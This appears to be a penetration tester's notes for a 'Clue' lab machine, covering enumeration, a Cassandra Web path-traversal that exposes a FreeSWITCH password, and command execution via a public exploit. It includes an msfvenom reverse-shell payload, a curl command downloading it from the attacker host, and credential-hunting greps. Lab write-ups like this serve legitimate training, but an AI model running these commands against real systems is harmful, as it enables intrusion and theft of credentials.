**Metadata**

- IP Address:  192.168.148.240
- Hostname: Clue
- OS: 	Linx
- Found Credentials/Users:
	-Cassie
	-Anthony

Main Objectives:

Local.txt = f158901d36b0ec1b873fb35365453448
Proof.txt = 46748177b79fdca8c287b44b98572c9c

**Enumeration**

1. NMAP Scans (TCP/UDP)

```
[+] Running: Nmap BASIC TCP (top 1000)
[+] Command: nmap -sS -Pn -n --top-ports 1000 -T4 --open 192.168.148.240 -oN - 
# Nmap 7.95 scan initiated Mon Mar  2 14:19:34 2026 as: nmap -sS -Pn -n --top-ports 1000 -T4 --open -oN - 192.168.148.240
Nmap scan report for 192.168.148.240
Host is up (0.084s latency).
Not shown: 994 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3000/tcp open  ppp
8021/tcp open  ftp-proxy

[+] Running: Nmap ALL TCP (all ports + versions)
[+] Command: nmap -sS -Pn -n -p- -T4 --open -sV --version-all 192.168.148.240 -oN /home/kali/ProvingGround/Clue/nmap/full_tcp.nmap -oG /home/kali/ProvingGround/Clue/nmap/full_tcp.gnmap 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-02 14:19 MST
Nmap scan report for 192.168.148.240
Host is up (0.081s latency).
Not shown: 65529 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE          VERSION
22/tcp   open  ssh              OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp   open  http             Apache httpd 2.4.38
139/tcp  open  netbios-ssn      Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn      Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
3000/tcp open  http             Thin httpd
8021/tcp open  freeswitch-event FreeSWITCH mod_event_socket
Service Info: Hosts: 127.0.0.1, CLUE; OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

2. Interesting Ports/Services

```
[+] Open TCP ports (open only): 22, 80, 139, 445, 3000, 8021
[+] Open UDP ports (open only): <none>

```

4. SSH Enumeration

```
22/tcp   open  ssh              OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 74:ba:20:23:89:92:62:02:9f:e7:3d:3b:83:d4:d9:6c (RSA)
|   256 54:8f:79:55:5a:b0:3a:69:5a:d5:72:39:64:fd:07:4e (ECDSA)
|_  256 7f:5d:10:27:62:ba:75:e9:bc:c8:4f:e2:72:87:d4:e2 (ED25519)

```

5. Web Enumeration 

```

80/tcp   open  http             Apache httpd 2.4.38
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: 403 Forbidden

Webserver Info - 
Running Applications - 
Site Visit - 

[+] Directory search BASIC on HTTP ports: 80,3000
[+] Running: Gobuster BASIC (80)
[+] Command: gobuster dir -u http://192.168.148.240:80 -w /usr/share/wordlists/dirb/common.txt -t 50 -o /home/kali/ProvingGround/Clue/gobuster/Clue_192.168.148.240_80_dir_basic.txt 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.148.240:80
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 280]
/.htaccess            (Status: 403) [Size: 280]
/backup               (Status: 301) [Size: 319] [--> http://192.168.148.240/backup/]
/.htpasswd            (Status: 403) [Size: 280]
Progress: 1142 / 4613 (24.76%)[ERROR] error on word .svn: timeout occurred during the request
/server-status        (Status: 403) [Size: 280]
Progress: 4501 / 4613 (97.57%)
Progress: 4613 / 4613 (100.00%)===============================================================
Finished

[+] Running: Gobuster FILE search (80)
[+] Command: gobuster dir -u http://192.168.148.240:80 -w /usr/share/wordlists/dirb/common.txt -x php\,asp\,aspx\,jsp\,html\,txt\,bak\,old\,zip\,tar\,tar.gz -t 50 -o /home/kali/ProvingGround/Clue/gobuster/Clue_192.168.148.240_80_files.txt 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.148.240:80
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              tar.gz,php,aspx,jsp,html,txt,old,zip,tar,asp,bak
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================

/backup               (Status: 301) [Size: 319] [--> http://192.168.148.240/backup/]
/server-status        (Status: 403) [Size: 280]
Progress: 55356 / 55356 (100.00%)
Progress: 55356 / 55356 (100.00%)===============================================================
Finished



curl -i http://target

```

7. SMB Port 139, 445 Enumeration

```

139/tcp  open  netbios-ssn      Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn      Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)

|_clock-skew: mean: 1h40m01s, deviation: 2h53m15s, median: 0s
| smb2-time: 
|   date: 2026-03-02T21:42:02
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.9.5-Debian)
|   Computer name: clue
|   NetBIOS computer name: CLUE\x00
|   Domain name: pg
|   FQDN: clue.pg
|_  System time: 2026-03-02T16:42:04-05:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

smbclient -L //192.168.101.110 -U anonymous
ls
mget 
put dork.txt

enum4linux $IP

smbmap -H 192.168.101.110                  

smbclient //192.168.101.110/Backup -N          

```

8. Port 3000

```
3000/tcp open  http             Thin httpd

Site visit:

- Cassandra Web site found
- You can execute CQL
  
[+] Running: Gobuster BASIC (3000) (exclude-length 3837)
[+] Command: gobuster dir -u http://192.168.148.240:3000 -w /usr/share/wordlists/dirb/common.txt -t 50 -o /home/kali/ProvingGround/Clue/gobuster/Clue_192.168.148.240_3000_dir_basic.txt --exclude-length 3837 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.148.240:3000
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] Exclude Length:          3837
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/hosts                (Status: 200) [Size: 148]
Progress: 4612 / 4613 (99.98%)[ERROR] error on word events: timeout occurred during the request
Progress: 4613 / 4613 (100.00%)
===============================================================
Finished

```

9. Port 8021

```
8021/tcp open  freeswitch-event FreeSWITCH mod_event_socket

nc 192.168.148.240 8021                                   
Content-Type: auth/request


Content-Type: text/disconnect-notice
Content-Length: 67

Disconnected, goodbye.
See you at ClueCon! http://www.cluecon.com/

```

10. Possible Exploits

```
https://www.exploit-db.com/exploits/47799
https://www.exploit-db.com/exploits/49362
```

11. Other Notes

```

```

**Initial Foothold** 

1. Exploit Steps

- Exploit involved the use of two exploits. The first was for https://www.exploit-db.com/exploits/47799. However, the default password did not appear to be configured so the first exploit was https://www.exploit-db.com/exploits/49362.

- Identified that target was using Cassandra Web. Downloaded and successfully executed exploit allowing for directory transversal. 

![[Pasted image 20260302162221.png]]

- During research of the following site, found that FreeSwitch password was stored in  /etc/freeswitch/autoload_configs/event_socket.conf.xml.  https://x7331.gitbook.io/boxes/services/tcp/8021-freeswitch.

- Used the 47799 Cassandra Web exploit to view the file.

```
python3 ./49362.py 192.168.148.240 /etc/freeswitch/autoload_configs/event_socket.conf.xml
```

![[Pasted image 20260302162503.png]]

- Updated the FreeSwitch exploit to include found password. 

![[Pasted image 20260302162616.png]]

- Successfully executed commands using exploit 47799.

![[Pasted image 20260302162717.png]]
 - Through trial and error, found that port 80 was open. 
 
 - Created reverse shell .elf using msfvenom.

```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.45.215 LPORT=80 -f elf -o shell.elf
```

 - Copied shell over using curl to /tmp

```
python3 ./47799.py 192.168.148.240 "curl -o /tmp/shell.elf http://192.168.45.215/shell.elf"
```
 
 - Executed .elf and received reverse shell as freeswitch.

![[Pasted image 20260302200336.png]]

![[Pasted image 20260302195945.png]]
2. Shell Upgrade

```
python3 -c 'import pty; pty.spawn("/bin/bash")'

python -c 'import pty; pty.spawn("/bin/bash")'

/usr/bin/script -qc /bin/bash /dev/null

export TERM=xterm

export SHELL=/bin/bash

Ctrl+Z

stty raw -echo; fg

reset
```

**Post-Exploitation**

1. Identify & System Info

```
whoami

id
uid=998(freeswitch) gid=998(freeswitch) groups=998(freeswitch)

hostname
clue

pwd

uname -a
Linux clue 4.19.0-21-amd64 #1 SMP Debian 4.19.249-2 (2022-06-30) x86_64 GNU/Linux

cat /etc/os-release 2>/dev/null || cat /etc/issue 2>/dev/null
freeswitch@clue:/$ cat /etc/os-release 2>/dev/null || cat /etc/issue 2>/dev/null
PRETTY_NAME="Debian GNU/Linux 10 (buster)"
NAME="Debian GNU/Linux"
VERSION_ID="10"
VERSION="10 (buster)"
VERSION_CODENAME=buster
ID=debian
HOME_URL="https://www.debian.org/"
SUPPORT_URL="https://www.debian.org/support"
BUG_REPORT_URL="https://bugs.debian.org/"

```

2. Environment

```
env
SHELL=/usr/bin/bash
PWD=/
TERM=xterm-256color
SHLVL=1
LC_CTYPE=C.UTF-8
_=/usr/bin/env
OLDPWD=/etc


set 2>/dev/null | head -n 50
SHELL=/usr/bin/bash
PWD=/
TERM=xterm-256color
SHLVL=1
LC_CTYPE=C.UTF-8
_=/usr/bin/env
OLDPWD=/etc
freeswitch@clue:/$ set 2>/dev/null | head -n 50
BASH=/usr/bin/bash
BASHOPTS=checkwinsize:cmdhist:complete_fullquote:expand_aliases:extquote:force_fignore:globasciiranges:hostcomplete:interactive_comments:progcomp:promptvars:sourcepath
BASH_ALIASES=()
BASH_ARGC=([0]="0")
BASH_ARGV=()
BASH_CMDS=()
BASH_LINENO=()
BASH_SOURCE=()
BASH_VERSINFO=([0]="5" [1]="0" [2]="3" [3]="1" [4]="release" [5]="x86_64-pc-linux-gnu")
BASH_VERSION='5.0.3(1)-release'
COLUMNS=116
DIRSTACK=()
EUID=998
GROUPS=()
HISTFILE=/var/lib/freeswitch/.bash_history
HISTFILESIZE=500
HISTSIZE=500
HOSTNAME=clue
HOSTTYPE=x86_64
IFS=$' \t\n'
LC_CTYPE=C.UTF-8
LINES=59
MACHTYPE=x86_64-pc-linux-gnu
MAILCHECK=60
MTjrbDwDqR=UIJqRuxsIO
OLDPWD=/etc
OPTERR=1
OPTIND=1
OSTYPE=linux-gnu
PATH=/usr/local/bin:/usr/local/sbin:/usr/bin:/usr/sbin:/bin:/sbin:.
PIPESTATUS=([0]="0")
PPID=1784
PS1='${debian_chroot:+($debian_chroot)}\u@\h:\w\$ '
PS2='> '
PS4='+ '
PWD=/
QTWMcEwJFL=UHZcIROZDi
RDuMkavWDl=aJpRIwyGZY
SHELL=/usr/bin/bash
SHELLOPTS=braceexpand:emacs:hashall:histexpand:history:interactive-comments:monitor
SHLVL=1
TERM=xterm-256color
UID=998
UvLbvcevbV=hLWSKDekFY
_=env
jRkwUHoqlJ=YmnGnELAqg


echo "$PATH"
/usr/local/bin:/usr/local/sbin:/usr/bin:/usr/sbin:/bin:/sbin:.

echo "HOME=$HOME"; echo "SHELL=$SHELL"
HOME=
SHELL=/usr/bin/bash

```

3. User & Home Directories

```
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
cassie:x:1000:1000::/home/cassie:/bin/bash
anthony:x:1001:1001::/home/anthony:/bin/bash


ls -la /home
total 16
drwxr-xr-x  4 root    root    4096 Aug  5  2022 .
drwxr-xr-x 18 root    root    4096 Aug  5  2022 ..
drwxr-xr-x  3 anthony anthony 4096 Aug  5  2022 anthony
drwxr-xr-x  4 cassie  cassie  4096 Aug 11  2022 cassie


ls -la /root 2>/dev/null
Denied

sudo -l 2>/dev/null
Password required

sudo -V 2>/dev/null | head -n 10
Sudo version 1.8.27
Sudoers policy plugin version 1.8.27
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.27


```

4. Writable Paths & Permissions

```
find / -writable -type d 2>/dev/null | head -n 50
/usr/share/freeswitch
/usr/share/freeswitch/sounds
/usr/share/freeswitch/grammar
/usr/share/freeswitch/htdocs
/usr/share/freeswitch/fonts
/usr/share/freeswitch/conf
/usr/share/freeswitch/conf/vanilla
/usr/share/freeswitch/conf/vanilla/skinny_profiles
/usr/share/freeswitch/conf/vanilla/jingle_profiles
/usr/share/freeswitch/conf/vanilla/mrcp_profiles
/usr/share/freeswitch/conf/vanilla/lang
/usr/share/freeswitch/conf/vanilla/lang/sv
/usr/share/freeswitch/conf/vanilla/lang/sv/vm
/usr/share/freeswitch/conf/vanilla/lang/ru
/usr/share/freeswitch/conf/vanilla/lang/ru/dir
/usr/share/freeswitch/conf/vanilla/lang/ru/demo
/usr/share/freeswitch/conf/vanilla/lang/ru/vm
/usr/share/freeswitch/conf/vanilla/lang/de
/usr/share/freeswitch/conf/vanilla/lang/de/demo
/usr/share/freeswitch/conf/vanilla/lang/de/vm
/usr/share/freeswitch/conf/vanilla/lang/pt
/usr/share/freeswitch/conf/vanilla/lang/pt/dir
/usr/share/freeswitch/conf/vanilla/lang/pt/demo
/usr/share/freeswitch/conf/vanilla/lang/pt/vm
/usr/share/freeswitch/conf/vanilla/lang/es
/usr/share/freeswitch/conf/vanilla/lang/es/dir
/usr/share/freeswitch/conf/vanilla/lang/es/demo
/usr/share/freeswitch/conf/vanilla/lang/es/vm
/usr/share/freeswitch/conf/vanilla/lang/fr
/usr/share/freeswitch/conf/vanilla/lang/fr/dir
/usr/share/freeswitch/conf/vanilla/lang/fr/demo
/usr/share/freeswitch/conf/vanilla/lang/fr/vm
/usr/share/freeswitch/conf/vanilla/lang/he
/usr/share/freeswitch/conf/vanilla/lang/he/dir
/usr/share/freeswitch/conf/vanilla/lang/he/demo
/usr/share/freeswitch/conf/vanilla/lang/he/vm
/usr/share/freeswitch/conf/vanilla/lang/en
/usr/share/freeswitch/conf/vanilla/lang/en/dir
/usr/share/freeswitch/conf/vanilla/lang/en/ivr
/usr/share/freeswitch/conf/vanilla/lang/en/demo
/usr/share/freeswitch/conf/vanilla/lang/en/vm
/usr/share/freeswitch/conf/vanilla/chatplan
/usr/share/freeswitch/conf/vanilla/yaml
/usr/share/freeswitch/conf/vanilla/ivr_menus
/usr/share/freeswitch/conf/vanilla/dialplan
/usr/share/freeswitch/conf/vanilla/dialplan/skinny-patterns
/usr/share/freeswitch/conf/vanilla/dialplan/default
/usr/share/freeswitch/conf/vanilla/dialplan/public
/usr/share/freeswitch/conf/vanilla/autoload_configs
/usr/share/freeswitch/conf/vanilla/sip_profiles


find / -writable -type f 2>/dev/null | head -n 50
/usr/share/freeswitch/fonts/FreeSans.ttf
/usr/share/freeswitch/fonts/FreeMono.ttf
/usr/share/freeswitch/conf/vanilla/vars.xml
/usr/share/freeswitch/conf/vanilla/tetris.ttml
/usr/share/freeswitch/conf/vanilla/freeswitch.xml
/usr/share/freeswitch/conf/vanilla/extensions.conf
/usr/share/freeswitch/conf/vanilla/notify-voicemail.tpl
/usr/share/freeswitch/conf/vanilla/skinny_profiles/internal.xml
/usr/share/freeswitch/conf/vanilla/mime.types
/usr/share/freeswitch/conf/vanilla/jingle_profiles/client.xml
/usr/share/freeswitch/conf/vanilla/jingle_profiles/server.xml
/usr/share/freeswitch/conf/vanilla/mrcp_profiles/loquendo-7-mrcp-v2.xml
/usr/share/freeswitch/conf/vanilla/mrcp_profiles/vestec-mrcp-v1.xml
/usr/share/freeswitch/conf/vanilla/mrcp_profiles/nuance-5.0-mrcp-v2.xml
/usr/share/freeswitch/conf/vanilla/mrcp_profiles/voxeo-prophecy-8.0-mrcp-v1.xml
/usr/share/freeswitch/conf/vanilla/mrcp_profiles/nuance-5.0-mrcp-v1.xml
/usr/share/freeswitch/conf/vanilla/mrcp_profiles/nuance-1.0.0-mrcp-v1.xml
/usr/share/freeswitch/conf/vanilla/mrcp_profiles/unimrcpserver-mrcp-v1.xml
/usr/share/freeswitch/conf/vanilla/config.FS0
/usr/share/freeswitch/conf/vanilla/lang/sv/sv.xml
/usr/share/freeswitch/conf/vanilla/lang/sv/vm/sounds.xml
/usr/share/freeswitch/conf/vanilla/lang/ru/dir/tts.xml
/usr/share/freeswitch/conf/vanilla/lang/ru/dir/sounds.xml
/usr/share/freeswitch/conf/vanilla/lang/ru/ru.xml
/usr/share/freeswitch/conf/vanilla/lang/ru/demo/demo-ivr.xml
/usr/share/freeswitch/conf/vanilla/lang/ru/demo/demo.xml
/usr/share/freeswitch/conf/vanilla/lang/ru/vm/tts.xml
/usr/share/freeswitch/conf/vanilla/lang/ru/vm/sounds.xml
/usr/share/freeswitch/conf/vanilla/lang/de/de.xml
/usr/share/freeswitch/conf/vanilla/lang/de/demo/demo.xml
/usr/share/freeswitch/conf/vanilla/lang/de/vm/tts.xml
/usr/share/freeswitch/conf/vanilla/lang/de/vm/sounds.xml
/usr/share/freeswitch/conf/vanilla/lang/pt/pt_BR.xml
/usr/share/freeswitch/conf/vanilla/lang/pt/dir/tts-pt-BR.xml
/usr/share/freeswitch/conf/vanilla/lang/pt/dir/sounds-pt-BR.xml
/usr/share/freeswitch/conf/vanilla/lang/pt/dir/tts-pt-PT.xml
/usr/share/freeswitch/conf/vanilla/lang/pt/dir/sounds-pt-PT.xml
/usr/share/freeswitch/conf/vanilla/lang/pt/demo/demo-pt-PT.xml
/usr/share/freeswitch/conf/vanilla/lang/pt/demo/demo-ivr-pt-PT.xml
/usr/share/freeswitch/conf/vanilla/lang/pt/demo/demo-ivr-pt-BR.xml
/usr/share/freeswitch/conf/vanilla/lang/pt/demo/demo-pt-BR.xml
/usr/share/freeswitch/conf/vanilla/lang/pt/vm/tts-pt-BR.xml
/usr/share/freeswitch/conf/vanilla/lang/pt/vm/sounds-pt-BR.xml
/usr/share/freeswitch/conf/vanilla/lang/pt/vm/tts-pt-PT.xml
/usr/share/freeswitch/conf/vanilla/lang/pt/vm/sounds-pt-PT.xml
/usr/share/freeswitch/conf/vanilla/lang/pt/pt_PT.xml
/usr/share/freeswitch/conf/vanilla/lang/es/dir/tts-es-MX.xml
/usr/share/freeswitch/conf/vanilla/lang/es/dir/tts-es-ES.xml
/usr/share/freeswitch/conf/vanilla/lang/es/dir/sounds-es-MX.xml

echo "$PATH" | tr ':' '\n' | while read -r p; do [ -z "$p" ] && continue; if [ -w "$p" ]; then echo "WRITABLE: $p"; else echo "OK: $p"; fi; done

find / -user "$(id -un)" -type f 2>/dev/null | head -n 50
/usr/share/freeswitch/fonts/FreeSans.ttf
/usr/share/freeswitch/fonts/FreeMono.ttf
/usr/share/freeswitch/conf/vanilla/vars.xml
/usr/share/freeswitch/conf/vanilla/tetris.ttml
/usr/share/freeswitch/conf/vanilla/freeswitch.xml
/usr/share/freeswitch/conf/vanilla/extensions.conf
/usr/share/freeswitch/conf/vanilla/notify-voicemail.tpl
/usr/share/freeswitch/conf/vanilla/skinny_profiles/internal.xml
/usr/share/freeswitch/conf/vanilla/mime.types
/usr/share/freeswitch/conf/vanilla/jingle_profiles/client.xml
/usr/share/freeswitch/conf/vanilla/jingle_profiles/server.xml
/usr/share/freeswitch/conf/vanilla/mrcp_profiles/loquendo-7-mrcp-v2.xml
/usr/share/freeswitch/conf/vanilla/mrcp_profiles/vestec-mrcp-v1.xml
/usr/share/freeswitch/conf/vanilla/mrcp_profiles/nuance-5.0-mrcp-v2.xml
/usr/share/freeswitch/conf/vanilla/mrcp_profiles/voxeo-prophecy-8.0-mrcp-v1.xml
/usr/share/freeswitch/conf/vanilla/mrcp_profiles/nuance-5.0-mrcp-v1.xml
/usr/share/freeswitch/conf/vanilla/mrcp_profiles/nuance-1.0.0-mrcp-v1.xml
/usr/share/freeswitch/conf/vanilla/mrcp_profiles/unimrcpserver-mrcp-v1.xml
/usr/share/freeswitch/conf/vanilla/config.FS0
/usr/share/freeswitch/conf/vanilla/lang/sv/sv.xml
/usr/share/freeswitch/conf/vanilla/lang/sv/vm/sounds.xml
/usr/share/freeswitch/conf/vanilla/lang/ru/dir/tts.xml
/usr/share/freeswitch/conf/vanilla/lang/ru/dir/sounds.xml
/usr/share/freeswitch/conf/vanilla/lang/ru/ru.xml
/usr/share/freeswitch/conf/vanilla/lang/ru/demo/demo-ivr.xml
/usr/share/freeswitch/conf/vanilla/lang/ru/demo/demo.xml
/usr/share/freeswitch/conf/vanilla/lang/ru/vm/tts.xml
/usr/share/freeswitch/conf/vanilla/lang/ru/vm/sounds.xml
/usr/share/freeswitch/conf/vanilla/lang/de/de.xml
/usr/share/freeswitch/conf/vanilla/lang/de/demo/demo.xml
/usr/share/freeswitch/conf/vanilla/lang/de/vm/tts.xml
/usr/share/freeswitch/conf/vanilla/lang/de/vm/sounds.xml
/usr/share/freeswitch/conf/vanilla/lang/pt/pt_BR.xml
/usr/share/freeswitch/conf/vanilla/lang/pt/dir/tts-pt-BR.xml
/usr/share/freeswitch/conf/vanilla/lang/pt/dir/sounds-pt-BR.xml
/usr/share/freeswitch/conf/vanilla/lang/pt/dir/tts-pt-PT.xml
/usr/share/freeswitch/conf/vanilla/lang/pt/dir/sounds-pt-PT.xml
/usr/share/freeswitch/conf/vanilla/lang/pt/demo/demo-pt-PT.xml
/usr/share/freeswitch/conf/vanilla/lang/pt/demo/demo-ivr-pt-PT.xml
/usr/share/freeswitch/conf/vanilla/lang/pt/demo/demo-ivr-pt-BR.xml
/usr/share/freeswitch/conf/vanilla/lang/pt/demo/demo-pt-BR.xml
/usr/share/freeswitch/conf/vanilla/lang/pt/vm/tts-pt-BR.xml
/usr/share/freeswitch/conf/vanilla/lang/pt/vm/sounds-pt-BR.xml
/usr/share/freeswitch/conf/vanilla/lang/pt/vm/tts-pt-PT.xml
/usr/share/freeswitch/conf/vanilla/lang/pt/vm/sounds-pt-PT.xml
/usr/share/freeswitch/conf/vanilla/lang/pt/pt_PT.xml
/usr/share/freeswitch/conf/vanilla/lang/es/dir/tts-es-MX.xml
/usr/share/freeswitch/conf/vanilla/lang/es/dir/tts-es-ES.xml
/usr/share/freeswitch/conf/vanilla/lang/es/dir/sounds-es-MX.xml
/usr/share/freeswitch/conf/vanilla/lang/es/dir/sounds-es-ES.xml

ls -l /etc/passwd 2>/dev/null
-rw-r--r-- 1 root root 1622 Aug  5  2022 /etc/passwd

ls -l /etc/shadow 2>/dev/null
-rw-r----- 1 root shadow 1156 Aug  5  2022 /etc/shadow

ls -la / 2>/dev/null
drwxr-xr-x  18 root root  4096 Aug  5  2022 .
drwxr-xr-x  18 root root  4096 Aug  5  2022 ..
lrwxrwxrwx   1 root root     7 Oct 20  2020 bin -> usr/bin
drwxr-xr-x   3 root root  4096 Aug  5  2022 boot
drwxr-xr-x  16 root root  3180 Aug  2  2024 dev
drwxr-xr-x  80 root root  4096 Apr 29  2024 etc
drwxr-xr-x   4 root root  4096 Aug  5  2022 home
lrwxrwxrwx   1 root root    31 Aug  5  2022 initrd.img -> boot/initrd.img-4.19.0-21-amd64
lrwxrwxrwx   1 root root    31 Aug  5  2022 initrd.img.old -> boot/initrd.img-4.19.0-18-amd64
lrwxrwxrwx   1 root root     7 Oct 20  2020 lib -> usr/lib
lrwxrwxrwx   1 root root     9 Oct 20  2020 lib32 -> usr/lib32
lrwxrwxrwx   1 root root     9 Oct 20  2020 lib64 -> usr/lib64
lrwxrwxrwx   1 root root    10 Oct 20  2020 libx32 -> usr/libx32
drwx------   2 root root 16384 Oct 20  2020 lost+found
drwxr-xr-x   3 root root  4096 Oct 20  2020 media
drwxr-xr-x   2 root root  4096 Oct 20  2020 mnt
drwxr-xr-x   2 root root  4096 Oct 20  2020 opt
dr-xr-xr-x 166 root root     0 Aug  2  2024 proc
drwx------   7 root root  4096 Mar  2 20:34 root
drwxr-xr-x  21 root root   580 Aug  2  2024 run
lrwxrwxrwx   1 root root     8 Oct 20  2020 sbin -> usr/sbin
drwxr-xr-x   3 root root  4096 Aug  5  2022 srv
dr-xr-xr-x  13 root root     0 Aug  2  2024 sys
drwxrwxrwt  12 root root  4096 Mar  2 21:39 tmp
drwxr-xr-x  13 root root  4096 Oct 20  2020 usr
drwxr-xr-x  12 root root  4096 Aug  5  2022 var
lrwxrwxrwx   1 root root    28 Aug  5  2022 vmlinuz -> boot/vmlinuz-4.19.0-21-amd64
lrwxrwxrwx   1 root root    28 Aug  5  2022 vmlinuz.old -> boot/vmlinuz-4.19.0-18-amd64

```

4. SUID / SGID / Capabilities

```
find / -perm -4000 -type f 2>/dev/null
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/bin/mount
/usr/bin/passwd
/usr/bin/su
/usr/bin/fusermount
/usr/bin/umount
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/gpasswd

find / -perm -2000 -type f 2>/dev/null
/usr/sbin/unix_chkpwd
/usr/bin/dotlockfile
/usr/bin/expiry
/usr/bin/ssh-agent
/usr/bin/bsd-write
/usr/bin/chage
/usr/bin/crontab
/usr/bin/wall

getcap -r / 2>/dev/null
/usr/bin/ping = cap_net_raw+ep

```

5. Cron & Scheduled Tasks

```
cat /etc/crontab 2>/dev/null
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )

ls -la /etc/cron.* 2>/dev/null
/etc/cron.d:
total 16
drwxr-xr-x  2 root root 4096 Aug  5  2022 .
drwxr-xr-x 80 root root 4096 Apr 29  2024 ..
-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder
-rw-r--r--  1 root root  712 Dec 17  2018 php

/etc/cron.daily:
total 48
drwxr-xr-x  2 root root 4096 Aug  5  2022 .
drwxr-xr-x 80 root root 4096 Apr 29  2024 ..
-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder
-rwxr-xr-x  1 root root  539 Aug  8  2020 apache2
-rwxr-xr-x  1 root root 1478 May 12  2020 apt-compat
-rwxr-xr-x  1 root root  355 Dec 29  2017 bsdmainutils
-rwxr-xr-x  1 root root 1187 Apr 18  2019 dpkg
-rwxr-xr-x  1 root root  377 Aug 28  2018 logrotate
-rwxr-xr-x  1 root root 1123 Feb 10  2019 man-db
-rwxr-xr-x  1 root root 1403 Mar 21  2019 ntp
-rwxr-xr-x  1 root root  249 Sep 27  2017 passwd
-rwxr-xr-x  1 root root  383 Feb  3  2022 samba

/etc/cron.hourly:
total 12
drwxr-xr-x  2 root root 4096 Oct 20  2020 .
drwxr-xr-x 80 root root 4096 Apr 29  2024 ..
-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder

/etc/cron.monthly:
total 12
drwxr-xr-x  2 root root 4096 Oct 20  2020 .
drwxr-xr-x 80 root root 4096 Apr 29  2024 ..
-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder

/etc/cron.weekly:
total 16
drwxr-xr-x  2 root root 4096 Oct 20  2020 .
drwxr-xr-x 80 root root 4096 Apr 29  2024 ..
-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder
-rwxr-xr-x  1 root root  813 Feb 10  2019 man-db

crontab -l 2>/dev/null
None
```

6. Processes & Network

```
ps aux

ps -ef

ss -tulwn 2>/dev/null
tcp         LISTEN       0            50                         0.0.0.0:139                     0.0.0.0:*          
tcp         LISTEN       0            50                       127.0.0.1:38123                   0.0.0.0:*          
tcp         LISTEN       0            128                        0.0.0.0:80                      0.0.0.0:*          
tcp         LISTEN       0            128                      127.0.0.1:9042                    0.0.0.0:*          
tcp         LISTEN       0            5                          0.0.0.0:8021                    0.0.0.0:*          
tcp         LISTEN       0            128                        0.0.0.0:22                      0.0.0.0:*          
tcp         LISTEN       0            100                        0.0.0.0:3000                    0.0.0.0:*          
tcp         LISTEN       0            128                      127.0.0.1:7000                    0.0.0.0:*          
tcp         LISTEN       0            50                         0.0.0.0:445                     0.0.0.0:*          
tcp         LISTEN       0            50                       127.0.0.1:7199                    0.0.0.0:*  

netstat -tulnp 2>/dev/null
```

7.  Software / Packages

```
dpkg -l 2>/dev/null | head -n 200

rpm -qa 2>/dev/null | head -n 200
```

8. Loot Files & Credentials

```
grep -R "password" /etc 2>/dev/null | head -n 50

ls -la /var/www 2>/dev/null

grep -R "password\|db\|user" /var/www 2>/dev/null | head -n 50

find /home -type f -name "*.txt" 2>/dev/null

find /home -type f -name "*history*" 2>/dev/null

find /home -type f \( -name "id_rsa" -o -name "id_*" \) 2>/dev/null

grep -Ri "password\|passwd\|secret\|token\|key" /home 2>/dev/null | head -n 50

